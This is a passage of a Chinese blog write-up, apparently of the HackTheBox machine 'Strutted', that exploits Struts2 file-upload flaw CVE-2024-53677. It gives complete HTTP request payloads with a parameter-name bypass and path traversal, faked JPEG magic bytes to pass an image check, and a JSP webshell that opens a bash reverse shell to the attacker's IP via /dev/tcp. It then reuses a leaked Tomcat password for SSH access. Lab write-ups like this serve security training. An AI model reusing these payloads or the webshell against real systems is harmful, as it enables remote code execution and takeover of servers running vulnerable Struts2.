src="https://gitee.com/ling-x5/img/raw/master/image-20250706191802334.png" alt="image-20250706191802334" style="zoom:50%;" /><p>于是我们们可以构造数据包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/strutted/upload.action?=../shell.jsp</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:8080<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>190<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;-Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;102&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost:8080<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarynPQvNY6ZvKUvK7vg<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost:8080/strutted/upload.action<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=2BF12D4C6451AFAE9FB0C4509738F8BE<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarynPQvNY6ZvKUvK7vg</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;upload&quot;; filename=&quot;1.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: application/octet-stream</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;% <span class="hljs-keyword">out</span>.println(&quot;EXP&quot;);%&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarynPQvNY6ZvKUvK7vg--</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;[0].top.uploadFileName&quot;;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: application/octet-stream</span><br><span class="language-pgsql">../shell.jsp</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarynPQvNY6ZvKUvK7vg--</span></span><br></code></pre></td></tr></table></figure><p>但是这样会被拦截，因为 ParametersInterceptor#isAccepted 的方法回去匹配正则表达式</p><p><code>\w+((\.\w+)|(\[\d+])|(\(\d+\))|(\[&#39;(\w-?|[\u4e00-\u9fa5]-?)+&#39;])|(\(&#39;(\w-?|[\u4e00-\u9fa5]-?)+&#39;\)))*</code></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250706200152702.png" alt="image-20250706200152702"></p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250706200459508.png" alt="image-20250706200459508" style="zoom:50%;" /><p>成功的匹配</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250706200518420.png" alt="image-20250706200518420" style="zoom:50%;" /><p>所以我们可以用 <code>top.uploadFileName</code> 替代 <code>[0].top.uploadFileName</code> 这两个表达式是等价的</p><h3 id="最终绕过-payload"><a href="#最终绕过-payload" class="headerlink" title="最终绕过 payload"></a>最终绕过 payload</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/strutted/upload.action?=../shell.jsp</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:8080<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>190<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;-Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;102&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost:8080<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarynPQvNY6ZvKUvK7vg<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost:8080/strutted/upload.action<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=2BF12D4C6451AFAE9FB0C4509738F8BE<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarynPQvNY6ZvKUvK7vg</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;upload&quot;; filename=&quot;1.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: application/octet-stream</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;% <span class="hljs-keyword">out</span>.println(&quot;EXP&quot;);%&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarynPQvNY6ZvKUvK7vg--</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;top.uploadFileName&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: application/octet-stream</span><br><span class="language-pgsql">../shell.jsp</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarynPQvNY6ZvKUvK7vg--</span></span><br></code></pre></td></tr></table></figure><h2 id="Strutted-靶机"><a href="#Strutted-靶机" class="headerlink" title="Strutted 靶机"></a>Strutted 靶机</h2><p>聊了这么多，我们的靶机是 <code>struts2 6.3.0.1</code> ，他可以使用 <code>CVE-2024-53677</code> 来进行文件上传，不过在这之前，我们还需要对开发人员自己写的 uploadAction 类中的 execute() 处理方法进行分析。看他是不是因为使用了框架，就疏于对文件上传的校验，从而可以使用框架的漏洞进行攻击。</p><h3 id="execute-方法"><a href="#execute-方法" class="headerlink" title="execute 方法"></a>execute 方法</h3><p>看它的 if() 判断，我们也能看出他做的限制，无非是 <code>文件是否为空</code> <code>isAllowedContentType</code> <code>isImageByMagicBytes</code> 可以看出他并没对文件的后缀名做白名单，或者黑名单的校验</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> ServletActionContext.getRequest().getMethod();<br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">noFileSelected</span> <span class="hljs-operator">=</span> (upload == <span class="hljs-literal">null</span> || StringUtils.isBlank(uploadFileName));<br><br>    <span class="hljs-keyword">if</span> (noFileSelected) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;POST&quot;</span>.equalsIgnoreCase(method)) &#123;<br>            addActionError(<span class="hljs-string">&quot;Please select a file to upload.&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> INPUT;<br>    &#125;<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">extension</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">dotIndex</span> <span class="hljs-operator">=</span> uploadFileName.lastIndexOf(<span class="hljs-string">&#x27;.&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (dotIndex != -<span class="hljs-number">1</span> &amp;&amp; dotIndex &lt; uploadFileName.length() - <span class="hljs-number">1</span>) &#123;<br>        extension = uploadFileName.substring(dotIndex).toLowerCase();<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!isAllowedContentType(uploadContentType)) &#123;<br>        addActionError(<span class="hljs-string">&quot;Only image files can be uploaded!&quot;</span>);<br>        <span class="hljs-keyword">return</span> INPUT;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!isImageByMagicBytes(upload)) &#123;<br>        addActionError(<span class="hljs-string">&quot;The file does not appear to be a valid image.&quot;</span>);<br>        <span class="hljs-keyword">return</span> INPUT;<br>    &#125;<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">baseUploadDirectory</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>) + <span class="hljs-string">&quot;/../webapps/ROOT/uploads/&quot;</span>;<br>    <span class="hljs-type">File</span> <span class="hljs-variable">baseDir</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(baseUploadDirectory);<br>    <span class="hljs-keyword">if</span> (!baseDir.exists() &amp;&amp; !baseDir.mkdirs()) &#123;<br>        addActionError(<span class="hljs-string">&quot;Server error: could not create base upload directory.&quot;</span>);<br>        <span class="hljs-keyword">return</span> INPUT;<br>    &#125;<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">timeStamp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(<span class="hljs-string">&quot;yyyyMMdd_HHmmss&quot;</span>).format(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());<br>    <span class="hljs-type">File</span> <span class="hljs-variable">timeDir</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(baseDir, timeStamp);<br>    <span class="hljs-keyword">if</span> (!timeDir.exists() &amp;&amp; !timeDir.mkdirs()) &#123;<br>        addActionError(<span class="hljs-string">&quot;Server error: could not create timestamped upload directory.&quot;</span>);<br>        <span class="hljs-keyword">return</span> INPUT;<br>    &#125;<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">relativeImagePath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;uploads/&quot;</span> + timeStamp + <span class="hljs-string">&quot;/&quot;</span> + uploadFileName;<br>    <span class="hljs-built_in">this</span>.imagePath = relativeImagePath;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">fullUrl</span> <span class="hljs-operator">=</span> constructFullUrl(relativeImagePath);<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">destFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(timeDir, uploadFileName);<br>        FileUtils.copyFile(upload, destFile);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">shortId</span> <span class="hljs-operator">=</span> generateShortId();<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">saved</span> <span class="hljs-operator">=</span> urlMapping.saveMapping(shortId, fullUrl);<br>        <span class="hljs-keyword">if</span> (!saved) &#123;<br>            addActionError(<span class="hljs-string">&quot;Server error: could not save URL mapping.&quot;</span>);<br>            <span class="hljs-keyword">return</span> INPUT;<br>        &#125;<br><br>        <span class="hljs-built_in">this</span>.shortenedUrl = ServletActionContext.getRequest().getRequestURL()<br>            .toString()<br>            .replace(ServletActionContext.getRequest().getRequestURI(), <span class="hljs-string">&quot;&quot;</span>) + <span class="hljs-string">&quot;/s/&quot;</span> + shortId;<br><br>        addActionMessage(<span class="hljs-string">&quot;File uploaded successfully &lt;a href=\&quot;&quot;</span> + shortenedUrl + <span class="hljs-string">&quot;\&quot; target=\&quot;_blank\&quot;&gt;View your file&lt;/a&gt;&quot;</span>);<br>        <span class="hljs-keyword">return</span> SUCCESS;<br><br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        addActionError(<span class="hljs-string">&quot;Error uploading file: &quot;</span> + e.getMessage());<br>        e.printStackTrace();<br>        <span class="hljs-keyword">return</span> INPUT;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们也可以看一下他对应的判断方法</p><h3 id="isAllowedContentType"><a href="#isAllowedContentType" class="headerlink" title="isAllowedContentType"></a>isAllowedContentType</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAllowedContentType</span><span class="hljs-params">(String contentType)</span> &#123;<br>    String[] allowedTypes = &#123;<span class="hljs-string">&quot;image/jpeg&quot;</span>, <span class="hljs-string">&quot;image/png&quot;</span>, <span class="hljs-string">&quot;image/gif&quot;</span>&#125;;<br>    <span class="hljs-keyword">for</span> (String allowedType : allowedTypes) &#123;<br>        <span class="hljs-keyword">if</span> (allowedType.equalsIgnoreCase(contentType)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="isImageByMagicBytes"><a href="#isImageByMagicBytes" class="headerlink" title="isImageByMagicBytes"></a>isImageByMagicBytes</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isImageByMagicBytes</span><span class="hljs-params">(File file)</span> &#123;<br>    <span class="hljs-type">byte</span>[] header = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">8</span>];<br>    <span class="hljs-keyword">try</span> (<span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file)) &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">bytesRead</span> <span class="hljs-operator">=</span> in.read(header, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>);<br>        <span class="hljs-keyword">if</span> (bytesRead &lt; <span class="hljs-number">8</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// JPEG</span><br>        <span class="hljs-keyword">if</span> (header[<span class="hljs-number">0</span>] == (<span class="hljs-type">byte</span>)<span class="hljs-number">0xFF</span> &amp;&amp; header[<span class="hljs-number">1</span>] == (<span class="hljs-type">byte</span>)<span class="hljs-number">0xD8</span> &amp;&amp; header[<span class="hljs-number">2</span>] == (<span class="hljs-type">byte</span>)<span class="hljs-number">0xFF</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// PNG</span><br>        <span class="hljs-keyword">if</span> (header[<span class="hljs-number">0</span>] == (<span class="hljs-type">byte</span>)<span class="hljs-number">0x89</span> &amp;&amp; header[<span class="hljs-number">1</span>] == (<span class="hljs-type">byte</span>)<span class="hljs-number">0x50</span> &amp;&amp; header[<span class="hljs-number">2</span>] == (<span class="hljs-type">byte</span>)<span class="hljs-number">0x4E</span> &amp;&amp; header[<span class="hljs-number">3</span>] == (<span class="hljs-type">byte</span>)<span class="hljs-number">0x47</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// GIF (GIF87a or GIF89a)</span><br>        <span class="hljs-keyword">if</span> (header[<span class="hljs-number">0</span>] == (<span class="hljs-type">byte</span>)<span class="hljs-number">0x47</span> &amp;&amp; header[<span class="hljs-number">1</span>] == (<span class="hljs-type">byte</span>)<span class="hljs-number">0x49</span> &amp;&amp; header[<span class="hljs-number">2</span>] == (<span class="hljs-type">byte</span>)<span class="hljs-number">0x46</span> &amp;&amp;<br>            header[<span class="hljs-number">3</span>] == (<span class="hljs-type">byte</span>)<span class="hljs-number">0x38</span> &amp;&amp; (header[<span class="hljs-number">4</span>] == (<span class="hljs-type">byte</span>)<span class="hljs-number">0x37</span> || header[<span class="hljs-number">4</span>] == (<span class="hljs-type">byte</span>)<span class="hljs-number">0x39</span>) &amp;&amp; header[<span class="hljs-number">5</span>] == (<span class="hljs-type">byte</span>)<span class="hljs-number">0x61</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br><br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        e.printStackTrace();<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们需要的就是满足 <code>ContentType</code> 为 <code>&#123;&quot;image/jpeg&quot;, &quot;image/png&quot;, &quot;image/gif&quot;&#125;</code> , 文件头部带着 <code>ImageMagicBytes</code> 再利用 <code>CVE-2024-53677</code> 就可以上传 webshell 了</p><p>构造数据包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.action;jsessionid=9EED75D669C81B098561B09CA9F49A5F</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>strutted.htb<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=---------------------------8585537542099060041342679052<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>381<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://strutted.htb<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://strutted.htb/<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=9EED75D669C81B098561B09CA9F49A5F<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br><br><span class="language-pgsql"><span class="hljs-comment">-----------------------------8585537542099060041342679052</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;Upload&quot;; filename=&quot;1.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/jpeg</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">ÿØÿ</span><br><span class="language-pgsql">&lt;% <span class="hljs-keyword">out</span>.println(&quot;EXP&quot;);%&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">-----------------------------8585537542099060041342679052</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;top.UploadFileName&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">../../shell.jsp</span><br><span class="language-pgsql"><span class="hljs-comment">-----------------------------8585537542099060041342679052--</span></span><br><span class="language-pgsql"></span><br></code></pre></td></tr></table></figure><p>看到上传成功了</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250706211213567.png" alt="image-20250706211213567"></p><blockquote><p>magic头的构造可以去 burp请求的 hex 模块 更改对应位置的16进制编码</p></blockquote><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250706211543416.png" alt="image-20250706211543416"></p><p>成功执行，我们可以写写webshell，反弹shell，内存马都可以。我们直接弹shell吧</p><h3 id="获得立足点"><a href="#获得立足点" class="headerlink" title="获得立足点"></a>获得立足点</h3><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;% String[] cmdArray = &#123;<br>    <span class="hljs-string">&quot;/bin/bash&quot;</span>,<br>    <span class="hljs-string">&quot;-c&quot;</span>,<br>    <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.14.119/4444 0&gt;&amp;1&quot;</span><br>&#125;;<br>Runtime.getRuntime().exec(cmdArray);<br>out.println(<span class="hljs-string">&quot;Reverse shell command dispatched.&quot;</span>);<br>%&gt;<br></code></pre></td></tr></table></figure><p>发送数据包</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250706214146364.png" alt="image-20250706214146364"></p><p>本地开启监听</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250706213639696.png" alt="image-20250706213639696"></p><p>访问 revShell.jsp</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250706214206279.png" alt="image-20250706214206279"></p><p>成功拿到shell</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250706214246747.png" alt="image-20250706214246747"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>再tomcat的配置文件<code>tomcat-users.xml</code>文件中, 看到一个admin的password字段</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250706214645792.png" alt="image-20250706214645792"></p><p>但是他注释了，但是我们依然可以尝试 ssh 的口令复用，再home目录下发现一个 <code>james</code> 用户</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250706214805445.png" alt="image-20250706214805445"></p><p>尝试ssh连接一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh james@10.10.11.59<br>james@10.10.11.59<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string"></span><br><span class="hljs-string">james@strutted:~$ whoami</span><br><span class="hljs-string">james</span><br><span class="hljs-string">james@strutted:~$ ip -br a</span><br><span class="hljs-string">lo               UNKNOWN        127.0.0.1/8 ::1/128 </span><br><span class="hljs-string">eth0             UP             10.10.11.59/23 fe80::250:56ff:feb0:ddd9/64 </span><br><span class="hljs-string">james@strutted:~$ </span><br></code></pre></td></tr></table></figure><p>查看一下特权命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">james@strutted:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> james on localhost:<br>    env_reset, mail_badpass, 